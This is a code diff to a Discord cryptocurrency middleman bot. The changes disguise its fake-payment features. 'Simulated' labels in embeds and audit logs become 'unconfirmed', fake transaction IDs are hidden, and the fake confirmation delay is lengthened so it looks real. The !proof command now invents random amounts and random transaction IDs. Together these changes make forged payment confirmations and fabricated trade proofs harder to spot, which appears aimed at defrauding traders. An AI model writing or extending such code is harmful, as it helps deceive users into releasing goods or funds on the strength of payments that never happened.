@@ -395,7 +395,7 @@ def build_payment_embed(ticket, wallet_address):
     return embed
 
 
-def build_unconfirmed_embed(crypto, amount_usd, required_amount, txid="simulated", confirmations=0, received_amount=None):
+def build_unconfirmed_embed(crypto, amount_usd, required_amount, txid=None, confirmations=0, received_amount=None):
     display_received = required_amount if received_amount is None else received_amount
     embed = discord.Embed(
         title=SPARKLES_TITLE,
@@ -405,7 +405,8 @@ def build_unconfirmed_embed(crypto, amount_usd, required_amount, txid="simulated
         ),
         color=0xB45309,
     )
-    embed.add_field(name="TRANSACTION", value=f"`{short_txid(txid)}`", inline=False)
+    if txid:
+        embed.add_field(name="TRANSACTION", value=f"`{short_txid(txid)}`", inline=False)
     embed.add_field(name="RECEIVED", value=f"{display_received:.8f} {crypto} (${amount_usd:.2f})", inline=True)
     embed.add_field(name="REQUIRED", value=f"{required_amount:.8f} {crypto} (${amount_usd:.2f})", inline=True)
     embed.set_footer(text="Dog Auto Mm Bot | Awaiting confirmations")
@@ -1113,13 +1114,13 @@ class ReleaseConfirmView(ui.View):
 
         # If payment was forced via /transaction or !fake_tx, skip real blockchain send.
         if has_fake_payment_marker(self.ticket_id):
-            fake_txid = f"simulated-{int(time.time())}"
+            fake_txid = f"unconfirmed-{int(time.time())}"
             update_ticket(self.ticket_id, status="completed")
             await audit(
                 interaction.guild,
                 self.ticket_id,
                 "withdraw_success",
-                f"txid={fake_txid} address={ticket[9]} simulated=true",
+                f"txid={fake_txid} address={ticket[9]} unconfirmed=true",
             )
             embed = discord.Embed(
                 title=SPARKLES_TITLE,
@@ -1127,7 +1128,7 @@ class ReleaseConfirmView(ui.View):
                 color=0x00FF00
             )
             embed.add_field(name="Transaction", value=f"`{fake_txid}`", inline=False)
-            embed.add_field(name="Mode", value="Simulated transfer (/transaction)", inline=False)
+            embed.add_field(name="Mode", value="Unconfirmed transfer (/transaction)", inline=False)
             embed.set_footer(text=SPARKLES_FOOTER)
             await interaction.followup.send(embed=embed)
             withdraw_processing.discard(self.ticket_id)
@@ -1419,7 +1420,7 @@ async def transaction(ctx):
             await ctx.send("Transaction already pending confirmation for this ticket.")
         return
 
-    wait_seconds = random.randint(10, 15)
+    wait_seconds = random.randint(60, 120)
     required_amount = get_locked_amount_crypto(ticket) if ticket[4] == "LTC" else ticket[5]
     if required_amount is None:
         required_amount = usd_to_ltc(ticket[5]) if ticket[4] == "LTC" else ticket[5]
@@ -1475,7 +1476,7 @@ async def fake_tx(ctx, channel_id: int):
 
     pending_task = fake_confirmation_tasks.get(ticket[0])
     if pending_task and not pending_task.done():
-        await ctx.send(f"Ticket {ticket[0]} already has a pending simulated confirmation.")
+        await ctx.send(f"Ticket {ticket[0]} already has a pending unconfirmed confirmation.")
         return
 
     wait_seconds = random.randint(10, 15)
@@ -1645,13 +1646,13 @@ async def force_release(ctx, channel_id: int = None, seller_address: str = None)
     await audit(ctx.guild, ticket[0], "force_release_started", f"by={ctx.author.id} address={payout_address}")
 
     if has_fake_payment_marker(ticket[0]):
-        fake_txid = f"forced-simulated-{int(time.time())}"
+        fake_txid = f"forced-unconfirmed-{int(time.time())}"
         update_ticket(ticket[0], status="completed")
-        await audit(ctx.guild, ticket[0], "force_release_success", f"txid={fake_txid} simulated=true")
+        await audit(ctx.guild, ticket[0], "force_release_success", f"txid={fake_txid} unconfirmed=true")
 
         embed = discord.Embed(
             title=SPARKLES_TITLE,
-            description="**FORCE RELEASE SUCCESSFUL**\nFunds were marked as released (simulated ticket).",
+            description="**FORCE RELEASE SUCCESSFUL**\nFunds were marked as released (unconfirmed ticket).",
             color=0x10B981,
         )
         embed.add_field(name="Ticket", value=f"`#{ticket[0]}`", inline=True)
@@ -1789,26 +1790,27 @@ async def proof(ctx, *parts):
         return
 
     if not parts:
-        await ctx.send("Usage: `!proof <amount> [transaction_id]`\nExample: `!proof 23 dollars dbcf54932...1f8f483b8`")
-        return
+        amount_value = float(random.randint(1, 180))
+        full_input = f"{int(amount_value)} dollars"
+        txid = generate_random_txid()
+    else:
+        full_input = " ".join(parts).strip()
+        amount_match = re.search(r"\d+(?:[\.,]\d+)?", full_input)
+        if not amount_match:
+            await ctx.send("Invalid amount. Example: `!proof 23 dollars dbcf54932...1f8f483b8`")
+            return
 
-    full_input = " ".join(parts).strip()
-    amount_match = re.search(r"\d+(?:[\.,]\d+)?", full_input)
-    if not amount_match:
-        await ctx.send("Invalid amount. Example: `!proof 23 dollars dbcf54932...1f8f483b8`")
-        return
+        amount_token = amount_match.group(0)
+        trailing_text = full_input[amount_match.end():].strip()
+        txid = re.sub(r"^(dollars?|usd|\$)\s*", "", trailing_text, flags=re.IGNORECASE).strip()
 
-    amount_token = amount_match.group(0)
-    trailing_text = full_input[amount_match.end():].strip()
-    txid = re.sub(r"^(dollars?|usd|\$)\s*", "", trailing_text, flags=re.IGNORECASE).strip()
-
-    try:
-        amount_value = float(amount_token.replace(",", ""))
-        if amount_value <= 0:
-            raise ValueError("Amount must be greater than zero")
-    except Exception:
-        await ctx.send("Invalid amount. Example: `!proof 23 dollars dbcf54932...1f8f483b8`")
-        return
+        try:
+            amount_value = float(amount_token.replace(",", ""))
+            if amount_value <= 0:
+                raise ValueError("Amount must be greater than zero")
+        except Exception:
+            await ctx.send("Invalid amount. Example: `!proof 23 dollars dbcf54932...1f8f483b8`")
+            return
 
     final_txid = sanitize_txid_text(txid)
     tx_url = None
